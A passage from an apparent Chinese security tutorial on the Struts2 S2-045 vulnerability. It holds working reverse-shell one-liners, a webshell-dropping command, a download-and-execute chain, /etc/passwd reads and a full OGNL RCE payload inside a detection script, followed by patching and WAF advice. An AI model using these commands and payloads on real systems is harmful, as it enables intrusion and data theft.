&lt;figure class=&#34;highlight http&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs http&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;HTTP/1.1&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;200&lt;/span&gt; OK&lt;br&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;Server&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;: &lt;/span&gt;Apache-Coyote/1.1&lt;br&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;Content-Type&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;: &lt;/span&gt;text/html;charset=UTF-8&lt;br&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;Content-Length&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;: &lt;/span&gt;9&lt;br&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;Date&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;: &lt;/span&gt;Wed, 24 Jul 2025 08:30:45 GMT&lt;br&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;Connection&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;: &lt;/span&gt;close&lt;br&gt;&lt;br&gt;&lt;span class=&#34;language-haskell&#34;&gt;&lt;span class=&#34;hljs-title&#34;&gt;www&lt;/span&gt;-&lt;span class=&#34;hljs-class&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;data&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h2 id=&#34;高级利用技巧&#34;&gt;&lt;a href=&#34;#高级利用技巧&#34; class=&#34;headerlink&#34; title=&#34;高级利用技巧&#34;&gt;&lt;/a&gt;高级利用技巧&lt;/h2&gt;&lt;h3 id=&#34;1-信息收集命令&#34;&gt;&lt;a href=&#34;#1-信息收集命令&#34; class=&#34;headerlink&#34; title=&#34;1. 信息收集命令&#34;&gt;&lt;/a&gt;1. 信息收集命令&lt;/h3&gt;&lt;figure class=&#34;highlight autoit&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs autoit&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;# 系统信息&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;#cmd=&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;uname -a&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;# 当前用户&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;#cmd=&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;id&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;# 网络配置&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;#cmd=&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;ifconfig&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;# 进程列表&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;#cmd=&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;ps aux&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;# 文件系统&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;#cmd=&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;ls -la /&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&#34;2-反弹Shell&#34;&gt;&lt;a href=&#34;#2-反弹Shell&#34; class=&#34;headerlink&#34; title=&#34;2. 反弹Shell&#34;&gt;&lt;/a&gt;2. 反弹Shell&lt;/h3&gt;&lt;figure class=&#34;highlight hsp&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs hsp&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;# Bash反弹Shell&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;#&lt;span class=&#34;hljs-keyword&#34;&gt;cmd&lt;/span&gt;=&amp;#x27;bash -i &amp;gt;&amp;amp; /dev/tcp/&lt;span class=&#34;hljs-number&#34;&gt;192.168&lt;/span&gt;&lt;span class=&#34;hljs-number&#34;&gt;.56&lt;/span&gt;&lt;span class=&#34;hljs-number&#34;&gt;.1&lt;/span&gt;/&lt;span class=&#34;hljs-number&#34;&gt;4444&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;&amp;gt;&amp;amp;&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;# Python反弹Shell&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;#&lt;span class=&#34;hljs-keyword&#34;&gt;cmd&lt;/span&gt;=&amp;#x27;python -c &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&amp;quot;192.168.56.1\&amp;quot;,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\&amp;quot;/bin/sh\&amp;quot;,\&amp;quot;-i\&amp;quot;]);&amp;quot;&lt;/span&gt;&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;# NC反弹Shell  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;#&lt;span class=&#34;hljs-keyword&#34;&gt;cmd&lt;/span&gt;=&amp;#x27;nc -e /bin/sh &lt;span class=&#34;hljs-number&#34;&gt;192.168&lt;/span&gt;&lt;span class=&#34;hljs-number&#34;&gt;.56&lt;/span&gt;&lt;span class=&#34;hljs-number&#34;&gt;.1&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;4444&lt;/span&gt;&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&#34;3-文件操作&#34;&gt;&lt;a href=&#34;#3-文件操作&#34; class=&#34;headerlink&#34; title=&#34;3. 文件操作&#34;&gt;&lt;/a&gt;3. 文件操作&lt;/h3&gt;&lt;figure class=&#34;highlight hsp&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs hsp&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;# 读取敏感文件&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;#&lt;span class=&#34;hljs-keyword&#34;&gt;cmd&lt;/span&gt;=&amp;#x27;cat /etc/passwd&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;# 写入WebShell&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;#&lt;span class=&#34;hljs-keyword&#34;&gt;cmd&lt;/span&gt;=&amp;#x27;echo &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;lt;%@ page import=\&amp;quot;java.io.*\&amp;quot; %&amp;gt;&amp;lt;% String cmd = request.getParameter(\&amp;quot;cmd\&amp;quot;); Process p = Runtime.getRuntime().exec(cmd); %&amp;gt;&amp;quot;&lt;/span&gt; &amp;gt; /tmp/shell.jsp&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;# 下载文件&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;#&lt;span class=&#34;hljs-keyword&#34;&gt;cmd&lt;/span&gt;=&amp;#x27;wget http:&lt;span class=&#34;hljs-comment&#34;&gt;//192.168.56.1:8000/shell.sh -O /tmp/shell.sh &amp;amp;&amp;amp; chmod +x /tmp/shell.sh &amp;amp;&amp;amp; /tmp/shell.sh&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h2 id=&#34;检测与防护&#34;&gt;&lt;a href=&#34;#检测与防护&#34; class=&#34;headerlink&#34; title=&#34;检测与防护&#34;&gt;&lt;/a&gt;检测与防护&lt;/h2&gt;&lt;h3 id=&#34;漏洞检测脚本&#34;&gt;&lt;a href=&#34;#漏洞检测脚本&#34; class=&#34;headerlink&#34; title=&#34;漏洞检测脚本&#34;&gt;&lt;/a&gt;漏洞检测脚本&lt;/h3&gt;&lt;figure class=&#34;highlight livescript&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs livescript&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;#!/usr/bin/env python3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; requests&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; sys&lt;br&gt;&lt;br&gt;def check_s2_045(url):&lt;br&gt;    payload = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;quot;&amp;quot;%&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;        (&lt;span class=&#34;hljs-subst&#34;&gt;#nike&lt;/span&gt;=&amp;#x27;multipart/form-data&amp;#x27;).&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;        (&lt;span class=&#34;hljs-subst&#34;&gt;#dm&lt;/span&gt;=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;        (&lt;span class=&#34;hljs-subst&#34;&gt;#_memberAccess&lt;/span&gt;?(&lt;span class=&#34;hljs-subst&#34;&gt;#_memberAccess&lt;/span&gt;=&lt;span class=&#34;hljs-subst&#34;&gt;#dm&lt;/span&gt;):(&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;            (&lt;span class=&#34;hljs-subst&#34;&gt;#container&lt;/span&gt;=&lt;span class=&#34;hljs-subst&#34;&gt;#context&lt;/span&gt;[&amp;#x27;com.opensymphony.xwork2.ActionContext.container&amp;#x27;]).&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;            (&lt;span class=&#34;hljs-subst&#34;&gt;#ognlUtil&lt;/span&gt;=&lt;span class=&#34;hljs-subst&#34;&gt;#container&lt;/span&gt;.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;            (&lt;span class=&#34;hljs-subst&#34;&gt;#ognlUtil&lt;/span&gt;.getExcludedPackageNames().clear()).&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;            (&lt;span class=&#34;hljs-subst&#34;&gt;#ognlUtil&lt;/span&gt;.getExcludedClasses().clear()).&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;            (&lt;span class=&#34;hljs-subst&#34;&gt;#context&lt;/span&gt;.setMemberAccess(&lt;span class=&#34;hljs-subst&#34;&gt;#dm&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;        )).&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;        (&lt;span class=&#34;hljs-subst&#34;&gt;#cmd&lt;/span&gt;=&amp;#x27;echo &amp;quot;S2045_VULN_TEST&amp;quot;&amp;#x27;).&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;        (&lt;span class=&#34;hljs-subst&#34;&gt;#iswin&lt;/span&gt;=(@java.lang.System@getProperty(&amp;#x27;os.name&amp;#x27;).toLowerCase().contains(&amp;#x27;win&amp;#x27;))).&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;        (&lt;span class=&#34;hljs-subst&#34;&gt;#cmds&lt;/span&gt;=(&lt;span class=&#34;hljs-subst&#34;&gt;#iswin&lt;/span&gt;?&amp;#123;&amp;#x27;cmd.exe&amp;#x27;,&amp;#x27;/c&amp;#x27;,&lt;span class=&#34;hljs-subst&#34;&gt;#cmd&lt;/span&gt;&amp;#125;:&amp;#123;&amp;#x27;/bin/bash&amp;#x27;,&amp;#x27;-c&amp;#x27;,&lt;span class=&#34;hljs-subst&#34;&gt;#cmd&lt;/span&gt;&amp;#125;)).&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;        (&lt;span class=&#34;hljs-subst&#34;&gt;#p&lt;/span&gt;=new java.lang.ProcessBuilder(&lt;span class=&#34;hljs-subst&#34;&gt;#cmds&lt;/span&gt;)).&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;        (&lt;span class=&#34;hljs-subst&#34;&gt;#p&lt;/span&gt;.redirectErrorStream(true)).&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;        (&lt;span class=&#34;hljs-subst&#34;&gt;#process&lt;/span&gt;=&lt;span class=&#34;hljs-subst&#34;&gt;#p&lt;/span&gt;.start()).&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;        (&lt;span class=&#34;hljs-subst&#34;&gt;#ros&lt;/span&gt;=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;        (@org.apache.commons.io.IOUtils@copy(&lt;span class=&#34;hljs-subst&#34;&gt;#process&lt;/span&gt;.getInputStream(),&lt;span class=&#34;hljs-subst&#34;&gt;#ros&lt;/span&gt;)).&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;        (&lt;span class=&#34;hljs-subst&#34;&gt;#ros&lt;/span&gt;.flush())&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;    &amp;#125;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;&lt;br&gt;    &lt;br&gt;    headers = &amp;#123;&lt;br&gt;        &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;Content-Type&amp;#x27;&lt;/span&gt;: payload,&lt;br&gt;        &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;User-Agent&amp;#x27;&lt;/span&gt;: &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;Mozilla/5.0 (compatible; S2-045-Scanner)&amp;#x27;&lt;/span&gt;&lt;br&gt;    &amp;#125;&lt;br&gt;    &lt;br&gt;    try:&lt;br&gt;        response = requests.get(url, headers=headers, timeout=&lt;span class=&#34;hljs-number&#34;&gt;10&lt;/span&gt;)&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;S2045_VULN_TEST&amp;quot;&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;in&lt;/span&gt; response.text:&lt;br&gt;            &lt;span class=&#34;hljs-built_in&#34;&gt;print&lt;/span&gt;(f&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[+] &amp;#123;url&amp;#125; is vulnerable to S2-045!&amp;quot;&lt;/span&gt;)&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; True&lt;br&gt;        else:&lt;br&gt;            &lt;span class=&#34;hljs-built_in&#34;&gt;print&lt;/span&gt;(f&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[-] &amp;#123;url&amp;#125; is not vulnerable to S2-045&amp;quot;&lt;/span&gt;)&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; False&lt;br&gt;    except Exception &lt;span class=&#34;hljs-keyword&#34;&gt;as&lt;/span&gt; e:&lt;br&gt;        &lt;span class=&#34;hljs-built_in&#34;&gt;print&lt;/span&gt;(f&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[!] Error testing &amp;#123;url&amp;#125;: &amp;#123;str(e)&amp;#125;&amp;quot;&lt;/span&gt;)&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; False&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; __name__ == &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;__main__&amp;quot;&lt;/span&gt;:&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; len(sys.argv) != &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;:&lt;br&gt;        &lt;span class=&#34;hljs-built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Usage: python3 s2-045-check.py &amp;lt;URL&amp;gt;&amp;quot;&lt;/span&gt;)&lt;br&gt;        sys.exit(&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;)&lt;br&gt;    &lt;br&gt;    target_url = sys.argv[&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;]&lt;br&gt;    check_s2_045(target_url)&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&#34;安全防护措施&#34;&gt;&lt;a href=&#34;#安全防护措施&#34; class=&#34;headerlink&#34; title=&#34;安全防护措施&#34;&gt;&lt;/a&gt;安全防护措施&lt;/h3&gt;&lt;h4 id=&#34;1-版本升级（根本解决方案）&#34;&gt;&lt;a href=&#34;#1-版本升级（根本解决方案）&#34; class=&#34;headerlink&#34; title=&#34;1. 版本升级（根本解决方案）&#34;&gt;&lt;/a&gt;1. 版本升级（根本解决方案）&lt;/h4&gt;&lt;figure class=&#34;highlight apache&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs apache&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;# 升级到安全版本&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;Apache&lt;/span&gt; Struts &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;.&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;.&lt;span class=&#34;hljs-number&#34;&gt;32&lt;/span&gt;+ 或 &lt;span class=&#34;hljs-number&#34;&gt;2.5.10.1&lt;/span&gt;+&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h4 id=&#34;2-WAF规则配置&#34;&gt;&lt;a href=&#34;#2-WAF规则配置&#34; class=&#34;headerlink&#34; title=&#34;2. WAF规则配置&#34;&gt;&lt;/a&gt;2. WAF规则配置&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;ModSecurity规则&lt;/strong&gt;:&lt;/p&gt;
&lt;figure class=&#34;highlight 1c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs 1c&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;# 检测S2-045攻击特征&lt;/span&gt;&lt;br&gt;SecRule REQUEST_HEADERS&lt;span class=&#34;hljs-punctuation&#34;&gt;:&lt;/span&gt;Content&lt;span class=&#34;hljs-punctuation&#34;&gt;-&lt;/span&gt;Type &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;@detectSQLi&amp;quot;&lt;/span&gt; 